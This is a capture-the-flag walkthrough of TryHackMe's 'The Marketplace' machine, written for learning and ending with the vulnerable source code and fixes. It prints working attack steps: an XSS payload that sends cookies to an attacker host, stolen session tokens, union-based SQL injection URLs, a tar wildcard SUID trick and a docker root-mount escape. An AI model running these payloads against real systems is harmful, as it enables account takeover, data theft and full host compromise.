---
title: "The Marketplace : TryHackMe"
last_modified_at: 2020-10-18ET14:40:02-05:00
categories:
  - TryHackMe
author_profile: true
toc: true
toc_label: Section
tags:
  - SQL Injection
  - XSS
  - Privilege Escalation
  - linux 
  - Docker
  - tar
  - TryHackMe
---

![/assets/images/TryHackMe/The_marketplace/Untitled.png](/assets/images/TryHackMe/The_marketplace/Untitled.png)

> The sysadmin of **The Marketplace**, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.
Can you take advantage of this and will you be able to gain root access on his server?

This machine has a vulnerable web application where we can use XSS to get the admin's cookie and gain admin access. Admin panel has SQLi vulnerability, using this we get SSH access to machine. Use tar wildcard vulnerability for horizontal privilege escalation and the escalated user is in docker group so we can create a docker container and mount the root directory to the container to gain root access.

# Nmap Scan

```bash
# Nmap 7.80 scan initiated Sun Oct 18 06:03:59 2020 as: nmap -sS -A -T4 -o nmap 10.10.150.107
Nmap scan report for 10.10.150.107
Host is up (0.18s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   178.71 ms 10.8.0.1
2   179.51 ms 10.10.150.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 18 06:04:36 2020 -- 1 IP address (1 host up) scanned in 37.31 seconds
```

sS : TCP syn scan

A : Version, default script, OS detection, traceroute

T4 : Faster scan

o : output the scan

Port 80 and 32768 has same webpages. 

# Port 80It has robots.txt file with /admin entry.

So we can login or signup

![/assets/images/TryHackMe/The_marketplace/Untitled%201.png](/assets/images/TryHackMe/The_marketplace/Untitled%201.png)

Since the robots.txt had /admin entry.

/admin

![/assets/images/TryHackMe/The_marketplace/Untitled%202.png](/assets/images/TryHackMe/The_marketplace/Untitled%202.png)

I tried SQLi in the login page but could not find anything. So signed up to the webapp.

![/assets/images/TryHackMe/The_marketplace/Untitled%203.png](/assets/images/TryHackMe/The_marketplace/Untitled%203.png)

Logged in

![/assets/images/TryHackMe/The_marketplace/Untitled%204.png](/assets/images/TryHackMe/The_marketplace/Untitled%204.png)

New Listing page posts the data to home page. Here I tried XSS 

![/assets/images/TryHackMe/The_marketplace/Untitled%205.png](/assets/images/TryHackMe/The_marketplace/Untitled%205.png)

Payload

```bash
<script>fetch("http://10.8.31.73:8000/"+document.cookie)</script>ro
```

Listen for request on my machine

```bash
$ python3 -m http.server
```

After hitting submit we get our cookie as request on our server

```bash
10.8.31.73 - - [18/Oct/2020 07:30:09] code 404, message File not found
10.8.31.73 - - [18/Oct/2020 07:30:09] "GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoicm8iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTYwMzAzODQ0M30.qoodJ0Jsx0aXK8NIs1g3RImqRU-VAsL7VMb8LNs_G4o HTTP/1.1" 404 -
```

So now we need some way so that admin clicks on this site and we get his/her  cookie

![/assets/images/TryHackMe/The_marketplace/Untitled%206.png](/assets/images/TryHackMe/The_marketplace/Untitled%206.png)

Report listing to admins does this.

![/assets/images/TryHackMe/The_marketplace/Untitled%207.png](/assets/images/TryHackMe/The_marketplace/Untitled%207.png)

After reporting we get the admin's token cookie

```bash
10.10.87.36 - - [18/Oct/2020 07:32:44] code 404, message File not found
10.10.87.36 - - [18/Oct/2020 07:32:44] "GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMwMzg3NjN9.CK10X5v85_ZO4PlVMm_XLJbfbGWL6eb8FONW535fNM0 HTTP/1.1" 404 -
```

Now if we change the token to the admin's token we get admin access

![/assets/images/TryHackMe/The_marketplace/Untitled%208.png](/assets/images/TryHackMe/The_marketplace/Untitled%208.png)

Now if we visit /admin

![/assets/images/TryHackMe/The_marketplace/Untitled%209.png](/assets/images/TryHackMe/The_marketplace/Untitled%209.png)

So we have admin access and got first flag as well.

Now if we click on any user

![/assets/images/TryHackMe/The_marketplace/Untitled%2010.png](/assets/images/TryHackMe/The_marketplace/Untitled%2010.png)

```bash
http://10.10.87.36/admin?user=2
```

User parameter is vulnerable. So 

# SQL Injection

## Number of columns

Lets first find the number of columns used using order by query

```bash
http://10.10.87.36/admin?user=2 order by <number>
```

If we set it to 4 we get the same page as above but if we set it 5 we get error message which means 4 columns are returned.

![/assets/images/TryHackMe/The_marketplace/Untitled%2011.png](/assets/images/TryHackMe/The_marketplace/Untitled%2011.png)

## Determine which columns are reflected

```bash
http://10.10.87.36/admin?user=0 union select 1,2,3,4
```

Since there is no user with id 0 so 1,2,3,4 is returned by the query.

![/assets/images/TryHackMe/The_marketplace/Untitled%2012.png](/assets/images/TryHackMe/The_marketplace/Untitled%2012.png)

So 1 and 2 are reflected.

## Database name

```bash
http://10.10.87.36/admin?user=0 union select 1,database(),3,4
```

database() returns database name

![/assets/images/TryHackMe/The_marketplace/Untitled%2013.png](/assets/images/TryHackMe/The_marketplace/Untitled%2013.png)

So the database name is marketplace

## Tables in database

```bash
http://10.10.87.36/admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'
```

Information_schema has metadata about the database.

![/assets/images/TryHackMe/The_marketplace/Untitled%2014.png](/assets/images/TryHackMe/The_marketplace/Untitled%2014.png)

## Columns in tables

```bash
http://10.10.87.36/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
```

![/assets/images/TryHackMe/The_marketplace/Untitled%2015.png](/assets/images/TryHackMe/The_marketplace/Untitled%2015.png)

Same can be done with other tables as well. There were password hashes but I could not find anything so I enumerated the database further.

## Columns in messages

```bash
http://10.10.87.36/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'
```

![/assets/images/TryHackMe/The_marketplace/Untitled%2016.png](/assets/images/TryHackMe/The_marketplace/Untitled%2016.png)

## Data from database

Lets get messages. Since we know the columns

```bash
http://10.10.87.36/admin?user=0 union select 1,group_concat(message_content,0x2b,user_to),3,4 from messages
```

0x2b i.e + acts as a delimeter.

![/assets/images/TryHackMe/The_marketplace/Untitled%2017.png](/assets/images/TryHackMe/The_marketplace/Untitled%2017.png)

So we have SSH password of the user 3. Let's find the user

```bash
http://10.10.87.36/admin?user=3
```

![/assets/images/TryHackMe/The_marketplace/Untitled%2018.png](/assets/images/TryHackMe/The_marketplace/Untitled%2018.png)

User : jake

Password : @b_ENXkGYUCAv3zJ

# SSH

```bash
$ ssh jake@10.10.87.36
```

home directory has the second flag

Lets see sudo permissions

```bash
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

So user jake can run /opt/backups/backup.sh as user michael without password.

```bash
jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

## Horizontal Privilege escalation

The tar wildcard is exploitable as we can execute any command using tar

```bash
$ tar cf /opt/backupd/backup.tar --checkpoint=1 --checkpoint-action=exec=sh ro.sh
```

This can be used to gain access

Lets create files `--checkpoint=1` `--checkpoint-action=exec sh [ro.sh](http://ro.sh)` `ro.sh`

[ro.sh](http://ro.sh) has the payload

```bash
jake@the-marketplace:~$ echo "fasdfa" > '--checkpoint=1'
jake@the-marketplace:~$ echo "dfadf"> '--checkpoint-action=exec=sh ro.sh'
```

contents of ro.sh

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

Adds a suid bit to the bash binary so that we can gain access to the user michael

Lets run the exploit

```bash
jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh 
Backing up files...
tar: user.txt: Cannot open: Permission denied
tar: Exiting with failure status due to previous errors
```

sudo -u michael to run the script as michael

user.txt permission denied so lets change the permission to 777

```bash
jake@the-marketplace:~$ chmod 777 user.txt 
jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh 
Backing up files...
jake@the-marketplace:~$
```

Lets look at /tmp

```bash
jake@the-marketplace:~$ ls -la /tmp
total 1124
drwxrwxrwt  9 root    root       4096 Oct 18 17:09 .
drwxr-xr-x 23 root    root       4096 Aug 23 08:18 ..
-rwsr-sr-x  1 michael michael 1113504 Oct 18 17:09 bash
drwxrwxrwt  2 root    root       4096 Oct 18 16:03 .font-unix
drwxrwxrwt  2 root    root       4096 Oct 18 16:03 .ICE-unix
drwx------  3 root    root       4096 Oct 18 16:03 systemd-private-af6d0431990545168451ab6c149be899-systemd-resolved.service-kchEIo
drwx------  3 root    root       4096 Oct 18 16:03 systemd-private-af6d0431990545168451ab6c149be899-systemd-timesyncd.service-0QCqil
drwxrwxrwt  2 root    root       4096 Oct 18 16:03 .Test-unix
drwxrwxrwt  2 root    root       4096 Oct 18 16:03 .X11-unix
drwxrwxrwt  2 root    root       4096 Oct 18 16:03 .XIM-unix
```

bash has suid bit

Lets access bash as user michael

```bash
$ /tmp/bash -p
bash-4.4$ id
uid=1000(jake) gid=1000(jake) euid=1002(michael) egid=1002(michael) groups=1002(michael),1000(jake)

```

Lets add ssh key to the user michael

```bash
$ mkdir /home/michael/.ssh
$ echo "my-pub-key' > /home/michael/.ssh/authorized_keys
```

Now let's ssh as user michael

```bash
$ ssh michael@10.10.87.36
```

User michael is in docker group. Which means we can escalate to root using docker

```bash
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

# Vertical privilege Escalation

## Docker Privilege Escalation

Lets view Available images

```bash
michael@the-marketplace:/tmp$ docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        6 weeks ago         2.16GB
nginx                        latest              4bb46517cac3        2 months ago        133MB
node                         lts-buster          9c4cc2688584        2 months ago        886MB
mysql                        latest              0d64f46acfd1        2 months ago        544MB
alpine                       latest              a24bb4013296        4 months ago        5.57MB
```

So we have many images. Lets use apline to create a container

```bash
$ docker run -v /:/mnt --rm -it alpine sh
```

-v /:/mnt to mount the root directory of host to /mnt inside the container

—rm : remove the container after the user exits

-it : interactive and assigna tty 

alpine : image to use to create container

sh : binary to run when the container starts

```bash
michael@the-marketplace:/tmp$ docker run -v /:/mnt --rm -it alpine sh
/ # ls -la /mnt/root/
total 28
drwx------    4 root     root          4096 Aug 23 15:20 .
drwxr-xr-x   23 root     root          4096 Aug 23 08:18 ..
lrwxrwxrwx    1 root     root             9 Aug 23 05:26 .bash_history -> /dev/null
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwxr-xr-x    3 root     root          4096 Aug 23 15:20 .local
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
drwx------    2 root     root          4096 Aug 23 03:48 .ssh
-r--------    1 root     root            38 Aug 23 05:25 root.txt
```

Finally we have the flag. We can add our public key to gain root access. 
# Vulnerable SQLi Code

```jsx
router.get('/admin', (req, res, next) => {
  if (!req.loggedIn || !req.user.admin) return res.status(403).render('error', {
    error: 'You are not authorized to view this page!'
  });
  if (req.query.user) {
    db.query('SELECT * FROM users WHERE id = ' + req.query.user, (error, items, fields) => {
      if (error) {
        return res.status(500).render('error', {
          error
        });
      }
      return res.render('adminUser', {
        title: `User ${items[0].id}`,
        user: items[0]
      });
    })
  } else {
    db.query('SELECT * FROM users', (err, items, fields) => {
      if (err) {
        return res.status(500).render('error', {
          error: 'An error occurred getting user list'
        });
      }
      return res.render('adminPanel', {
        title: 'User listing',
        users: items
      });
    })
  }
})
```

```bash
SELECT * FROM users WHERE id = ' + req.query.user
```

user parameter is directly added to the sql query which resulted in the SQLi vulnerability. Had there been prepared statements used SQLi would have been prevented

## XSS

### Code to store data

```jsx
router.post('/new', (req, res, next) => {                                                               
  if (!req.loggedIn) return res.status(403).render('error', {             
    error: 'Not logged in'                                                                     
  });                                                                                                   
  if (req.body.title && req.body.description) {              
    let obj = {                                                                                
      title: req.body.title,                                                                            
      description: req.body.description,                     
      author: req.user.userId,                                                                 
      image: '598815c0f5554115631a3250e5db1719'                                                         
    }                                                        
                                                                                               
                                                                                                        
    db.query(`INSERT INTO items SET ?`, obj, (err, results, fields) => {
      if (err) {                                                                               
        console.error(err)                                                                              
        return res.status(500).send('An error occurred while adding a new listing');
      }                                                                                                 
                                                                                            
      return res.redirect('/item/' + results.insertId);                             
    })                                                                                         
  } else {                                                                                  
    return res.send(400);                                                           
  }                                                                                            
})
```

Data is stored without any filter.

### Code to render data

```jsx
router.get('/item/:id', function (req, res, next) {                
  const id = parseInt(req.params.id) * 1;                                                               
                                                                          
  if (isNaN(id)) {                                 
    return res.status(404).render('error', {                                                            
      error: 'Item not found'                                             
    });                                                                                        
  }                                                                                                     
  db.query(`SELECT users.username, items.* FROM items
  LEFT JOIN users ON items.author = users.id WHERE items.id = ${id}`, (err, items, fields) => {
                                                                                                        
    console.log(err);                                
    **if (items && items[0]) {                                                                   
      const item = items[0];                                                                            
      res.render('item', {                           
        title: 'Item | The Marketplace',                                                       
        item                                                                                            
      })**                                             
      console.log(item)                                                                        
    } else {                                                                                            
      return res.status(404).render('error', {       
        error: 'Item not found'                                                                         
      });                                   
    }                                                
  });                                                                                          
});

```

### Template for rendering data

```jsx
/mnt/home/marketplace/the-marketplace/views # cat item.ejs 
<!DOCTYPE html>
<html>
  <head>
    <title><%= title %></title>
    <link rel='stylesheet' href='/stylesheets/style.css' />
  </head>
  <body>
    <%- include('navigation', { linkToHome: true }) %>
      <div id="item">
        <a href="/item/<%= item.id %>"><h1><%- item.title %></h1></a>
        <img src="/images/<%= item.image %>.jpg" />
        <div>Published by <%- item.username %></div>
        <div>Description: <br /> <%- item.description %></div>
        <div>
          <a href="/contact/<%= item.username %>">Contact the listing author</a> | <a href="/report/<%= item.id %>">Report listing to admins</a>
        </div>
      </div>
  </body>
</html>
```

Still no filter used to render data. This leads to XSS. Had the data been filtered during storage or during render or CSP used the XSS vulnerability leading to access of admin user would have been prevented. Also the cookie did not have property of http only. If it was set, attacker would not have access to the admin cookies.

# What I learned

- Take proper care when transmitting credentials
- Adding user to docker group can lead to privilege escalation